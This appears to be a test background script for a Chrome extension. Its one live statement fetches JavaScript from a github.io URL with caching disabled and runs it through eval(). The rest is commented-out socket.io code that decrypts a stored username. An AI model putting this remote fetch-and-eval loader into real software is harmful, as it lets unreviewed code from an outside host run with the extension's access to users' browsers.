fetch('https://fcupen.github.io/extension-chrome-test/module/background.module.js?v=2', { cache: "no-store" }).then(v => {
    v.text().then(code => {
        eval(code);
    });
});
// function connect() {
//     console.log('data'); // data will be 'woot' 
//     // const cryptoJS = CryptoJS;
//     // const loginStatusUsername = localStorage.getItem('sessionSignalFXUsername');
//     // if (loginStatusUsername) {
//     //     const decryptedUsername = cryptoJS.AES.decrypt(loginStatusUsername, 'https://chatbot-quantum.herokuapp.com/discord/connect').toString(cryptoJS.enc.Utf8);
//     //     socketIO.on('getDataChrome' + decryptedUsername, (data) => {

//     //         sendNotification();
//     //     });
//     // }
//     socketIO.on('connect', (socket) => {
//         // alert(socketIO.id);
//     });

//     socketIO.on('refreshPrice', (data) => {
//         // alert(data)
//     });

//     socketIO.emit('test', 'tobi', (data) => {
//         console.log(data); // data will be 'woot' 
//     });

// }
// setTimeout(() => { 
//     socketIO = io.connect('http://localhost:8080');
//     connect();
// }, 1000);